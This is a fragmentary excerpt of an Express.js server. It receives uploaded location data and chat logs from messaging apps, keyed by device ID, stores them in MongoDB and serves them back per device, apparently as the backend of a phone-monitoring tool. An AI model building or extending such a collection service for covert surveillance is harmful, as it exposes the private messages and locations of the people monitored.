...
app.post('/api/upload_data', async (req, res) => { 
    try {
    const body = req.body || {};
    let device_id = body.device_id || body.deviceId || body.id || req.headers['x-device-id'];
    ...
    try {
        ...
        if (type === 'location') {
            ...
            finalData.sort((a, b) => (a.name || "").localeCompare(b.name || ""));
             ...
             finalData = [...incoming, ...existing].slice(0, 30);
             ...
             incoming = incoming.map(m => {
                 ...
                 return {
                     ...
                     sender: m.sender || ((m.direction || '') === 'OUT' ? 'You' : (m.conversation || m.contact || 'Unknown')),
             ...
             for (const msg of incoming) {
                 ...
                 if (!appKey || !byApp[appKey]) {
                     console.warn('[chat_logs] skip unknown package', msg && msg.packageName);
                     continue;
                 }
                 const direction = String(msg.direction || 'IN').toUpperCase() === 'OUT' ? 'OUT' : 'IN';
                 const conversation = String(msg.conversation || '').trim();
                 if (!conversation || conversation.toLowerCase() === 'you') continue;
                 byApp[appKey].push({
             ...
             for (const appKey of Object.keys(byApp)) {
                 ...
                 try {
                     ...
                     console.log('[chat_logs] mongo', appKey, 'saved~', n, 'for', id);
                     ...
                     console.error('[chat_logs] mongo fail', appKey, e.message);
                 }
             }
             changedApps.forEach(appKey => {
                 try { io.to(id).emit('chat_update', { device_id: id, app: appKey }); } catch (e) {}
                 try { io.emit('chat_update', { device_id: id, app: appKey }); } catch (e) {}
             });
             finalData = incoming;
        ...
        // Never fail chat hard — client retries flood logs
        if (type === 'chat_logs') return res.json({ status: "ok", soft: true });
...
app.get('/api/get-data/:device_id/:type', async (req, res) => {
    ...
    try {
        if (fs.existsSync(filePath)) {
            ...
            if (raw) {
                try { return res.json(JSON.parse(raw)); } catch (e) {}
            }
        }
        try {
